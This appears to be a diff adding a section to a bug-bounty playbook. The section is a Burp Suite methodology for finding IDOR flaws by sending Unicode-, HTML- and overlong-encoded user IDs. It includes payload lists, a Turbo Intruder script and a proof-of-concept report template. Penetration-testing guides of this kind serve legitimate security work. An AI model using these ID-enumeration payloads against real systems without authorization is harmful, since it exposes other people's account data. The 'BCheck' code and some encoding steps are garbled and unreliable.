@@ -6836,3 +6836,436 @@ class DoubleEncodeGenerator:
 
 ---
 
+# 🎯 **Bug #13: Unicode Encoding IDOR - Complete Burp Suite Methodology**
+
+## 📋 **Bug Description**
+**IDOR via Unicode-encoded parameter manipulation** - Testing if the application improperly handles Unicode-encoded object references, allowing access to unauthorized resources.
+
+---
+
+## 🔍 **DETECTION PHASE**
+
+### **Step 1: Identify Potential IDOR Points**
+1. **Map the application**:
+   - Navigate through all authenticated areas
+   - Look for URLs/parameters containing:
+     - `id`, `user_id`, `account_id`, `document_id`
+     - `file`, `download`, `view`, `edit`, `delete`
+     - `/api/users/`, `/profile/`, `/orders/`
+
+2. **Burp Configuration**:
+```
+Target → Site Map → Right-click → Add to Scope
+Proxy → Intercept → Turn on
+```
+
+### **Step 2: Baseline Request Collection**
+1. **Capture a normal request**:
+```http
+GET /api/user/profile?id=100 HTTP/1.1
+Host: example.com
+Cookie: session=abc123
+```
+
+2. **Test basic IDOR first**:
+   - Send to Repeater
+   - Change `id=100` to `id=101`
+   - Note response (200 vs 403)
+
+---
+
+## 🧪 **TESTING PHASE FOR UNICODE ENCODING**
+
+### **Step 3: Unicode Encoding Preparation**
+
+#### **Unicode Encodings for Common IDs:**
+
+**For ID: 100**
+```
+Standard: 100
+Unicode: \u0031\u0030\u0030
+URL-encoded Unicode: %u0031%u0030%u0030
+HTML Unicode: &#49;&#48;&#48;
+UTF-8 hex: \x31\x30\x30
+UTF-16: \u0031\u0030\u0030
+UTF-32: \U00000031\U00000030\U00000030
+```
+
+**For ID: 101**
+```
+Standard: 101
+Unicode: \u0031\u0030\u0031
+URL-encoded: %u0031%u0030%u0031
+```
+
+### **Step 4: Burp Intruder Setup for Unicode Testing**
+
+#### **Intruder Attack 1: Direct Unicode**
+1. **Send request to Intruder** (Ctrl+I)
+2. **Positions tab**:
+```
+GET /api/user/profile?id=§100§
+```
+
+3. **Payloads tab**:
+```
+Payload type: Simple list
+Payload options:
+\u0031\u0030\u0030
+\u0031\u0030\u0031
+%u0031%u0030%u0030
+%u0031%u0030%u0031
+&#49;&#48;&#48;
+&#49;&#48;&#49;
+\x31\x30\x30
+\x31\x30\x31
+```
+
+4. **Attack Settings**:
+```
+Resource Pool: Create new (20 threads)
+Grep - Extract: Add response body markers
+Grep - Match: "unauthorized", "forbidden", "error"
+```
+
+---
+
+### **Step 5: Advanced Unicode Bypass Techniques**
+
+#### **Technique A: Mixed Encoding**
+Create a payload list for incremental IDs:
+```python
+# Generate payload.py
+for i in range(100, 110):
+    # UTF-8
+    utf8 = ''.join(['\\x' + hex(ord(d))[2:].zfill(2) for d in str(i)])
+    # UTF-16
+    utf16 = ''.join(['\\u' + hex(ord(d))[2:].zfill(4) for d in str(i)])
+    # HTML Entity
+    html = ''.join(['&#' + str(ord(d)) + ';' for d in str(i)])
+    # URL-encoded Unicode
+    url_uni = ''.join(['%u' + hex(ord(d))[2:].zfill(4) for d in str(i)])
+    
+    print(f"{i} -> {utf8} | {utf16} | {html} | {url_uni}")
+```
+
+#### **Technique B: Burp Intruder with Custom Payload Processing**
+
+1. **Payloads tab → Payload Processing**:
+```
+Add: Encode → URL-encode key characters
+Add: Encode → HTML-encode
+Add: Encode → Unicode-escape (Custom)
+```
+
+2. **Custom Unicode Function**:
+```python
+# Extender → Python environment
+def process_payload(payload):
+    # Convert "100" to \u0031\u0030\u0030
+    return ''.join(['\\u' + format(ord(c), '04x') for c in payload])
+```
+
+---
+
+### **Step 6: Burp Repeater Manual Testing**
+
+#### **Test Cases to Run Manually:**
+
+1. **Basic Unicode Escaping**:
+```
+Request 1: GET /api/user/profile?id=100
+Request 2: GET /api/user/profile?id=\u0031\u0030\u0030
+Request 3: GET /api/user/profile?id=\u0031\u0030\u0031
+```
+
+2. **Double-Encoded Unicode**:
+```
+Request: GET /api/user/profile?id=%25u0031%25u0030%25u0030
+```
+
+3. **Mixed Encoding Types**:
+```
+Request: GET /api/user/profile?id=&#49;\u0030%30
+```
+
+4. **Overlong UTF-8 Sequences**:
+```
+For '1': %C0%B1 (overlong)
+For '0': %C0%B0 (overlong)
+Request: GET /api/user/profile?id=%C0%B1%C0%B0%C0%B0
+```
+
+5. **Invalid Unicode Handling**:
+```
+Request: GET /api/user/profile?id=\u0031\u0030\u003z
+Request: GET /api/user/profile?id=\u0031\u0030\ud800
+```
+
+---
+
+## 🔬 **ANALYSIS PHASE**
+
+### **Step 7: Response Analysis**
+
+#### **What to Look For:**
+
+1. **Successful Exploit Indicators**:
+```http
+HTTP/1.1 200 OK
+Content-Type: application/json
+{
+    "user": {
+        "id": 101,
+        "email": "victim@example.com",
+        "data": "sensitive information"
+    }
+}
+```
+
+2. **Partial Information Disclosure**:
+```http
+HTTP/1.1 200 OK
+Content-Type: text/html
+<!-- User ID: 101 found in comment -->
+```
+
+3. **Error Message Leakage**:
+```http
+HTTP/1.1 500 Internal Server Error
+Invalid user ID: 101
+```
+
+### **Step 8: Burp Comparer for Response Diff**
+
+1. **Select two requests**:
+   - Original authorized request (ID 100)
+   - Unicode-encoded attempt for ID 101
+
+2. **Send to Comparer**:
+```
+Right-click → Send to Comparer
+Word comparison or Byte comparison
+```
+
+3. **Analyze differences**:
+   - Similar length = possible success
+   - Key terms appearing: user email, private data
+   - Missing "unauthorized" messages
+
+---
+
+## 📊 **AUTOMATED SCANNING**
+
+### **Step 9: Burp Active Scan with Custom Checks**
+
+1. **Create BCheck (Burp Check)**:
+```javascript
+// Extender → BCheck Studio
+{
+  name: "Unicode IDOR Detection";
+  type: "active";
+  description: "Tests for Unicode-encoded IDOR vulnerabilities";
+  
+  run for: each request;
+  
+  // Test payloads
+  define unicode_payloads = [
+    "\u0031\u0030\u0030",
+    "\u0031\u0030\u0031",
+    "%u0031%u0030%u0030",
+    "&#49;&#48;&#48;",
+    "\x31\x30\x30"
+  ];
+  
+  // Check response
+  if (response.status == 200 && 
+      response.length > original.length * 0.8) {
+    report issue(
+      severity: "High",
+      confidence: "Firm",
+      description: "Unicode IDOR Bypass Possible"
+    );
+  }
+}
+```
+
+### **Step 10: Intruder Cluster Bomb Attack**
+
+For testing multiple IDs with multiple encodings:
+
+1. **Positions**:
+```
+GET /api/user/profile?id=§100§§_ENCODING_§
+```
+
+2. **Payload Set 1 (IDs)**:
+```
+100, 101, 102, 103, 104, 105
+```
+
+3. **Payload Set 2 (Encodings)**:
+```
+none,\u,\u0025u,&#x;,&#;
+```
+
+4. **Payload Processing**:
+```
+Combine payloads with custom delimiter
+```
+
+---
+
+## 🔧 **ADVANCED BURP TECHNIQUES**
+
+### **Step 11: Session Handling Rules**
+
+1. **Add MACRO for authentication**:
+```
+Project options → Sessions → Session Handling Rules
+Add rule → Run a macro
+Select login sequence
+```
+
+2. **Cookie handling**:
+```
+Add rule → Check session valid
+If invalid → Run macro
+Update cookies automatically
+```
+
+### **Step 12: Turbo Intruder for Speed**
+
+```python
+# Turbo Intruder script
+def queueRequests(target, wordlists):
+    engine = RequestEngine(endpoint=target.endpoint,
+                           concurrentConnections=5,
+                           requestsPerConnection=100,
+                           pipeline=False)
+
+    ids = ['100', '101', '102', '103', '104']
+    encodings = ['', '\\u0031', '%u0031', '&#49;']
+    
+    for id in ids:
+        for enc in encodings:
+            engine.queue(target.req, [id, enc])
+            
+    engine.start(timeout=10)
+
+def handleResponse(req, interesting):
+    if '200' in req.response and len(req.response) > 1000:
+        table.add(req)
+```
+
+---
+
+## 📝 **DOCUMENTATION & REPORTING**
+
+### **Step 13: Proof of Concept Template**
+
+```markdown
+# IDOR via Unicode Encoding
+
+## Vulnerability Details
+- **Bug ID**: #13 (Unicode Encoding IDOR)
+- **Endpoint**: /api/user/profile
+- **Parameter**: id
+- **Original ID**: 100 (victim@example.com)
+- **Target ID**: 101 (admin@example.com)
+
+## Exploit Steps
+1. Log in as user (ID: 100)
+2. Capture request to /api/user/profile
+3. Modify parameter: id=\u0031\u0030\u0031
+4. Forward request
+5. Observe unauthorized access
+
+## HTTP Request
+\`\`\`http
+GET /api/user/profile?id=\u0031\u0030\u0031 HTTP/1.1
+Host: example.com
+Cookie: [valid_session]
+\`\`\`
+
+## HTTP Response (Sensitive Data)
+\`\`\`json
+{
+    "id": 101,
+    "email": "admin@example.com",
+    "role": "administrator",
+    "private_data": "..."
+}
+\`\`\`
+
+## Impact
+Unauthorized access to admin account data
+Potential privilege escalation
+Data breach risk
+
+## Remediation
+- Implement proper access controls
+- Use indirect reference maps
+- Validate Unicode decoding
+- Apply consistent authorization checks
+```
+
+---
+
+## 🎯 **SUCCESS INDICATORS**
+
+### **Green Flags (Vulnerable)**
+- ✅ 200 OK with different user's data
+- ✅ Partial information disclosure
+- ✅ Different content length than unauthorized
+- ✅ "Welcome [different username]"
+- ✅ Admin panel access
+
+### **Red Flags (Not Vulnerable)**
+- ❌ 403 Forbidden
+- ❌ 302 Redirect to login
+- ❌ "Unauthorized" message
+- ❌ Same content as original
+- ❌ Input validation error
+
+---
+
+## 🛡️ **TESTING CHECKLIST**
+
+```
+[ ] Identify all parameter-based endpoints
+[ ] Capture baseline requests
+[ ] Test basic IDOR first
+[ ] Generate Unicode payloads
+[ ] Configure Burp Intruder
+[ ] Run multiple encoding variations
+[ ] Check response differences
+[ ] Verify with Burp Comparer
+[ ] Document successful attempts
+[ ] Create POC video/screenshots
+[ ] Report with impact assessment
+```
+
+---
+
+## ⚡ **PRO TIPS**
+
+1. **Use Burp Extensions**:
+   - Hackvertor (for encoding/decoding)
+   - J2EEScan (for additional checks)
+   - Active Scan++ (enhanced scanning)
+
+2. **Combine with Other Bugs**:
+   - Unicode bypass + Race condition
+   - Unicode + Parameter pollution
+
+3. **Monitor Response Times**:
+   - Unicode decoding might cause delays
+   - 500 errors indicate processing
+
+4. **Check Logs/Error Pages**:
+   - Unicode decoding errors might leak info
+   - Stack traces with IDs
+
+---
+
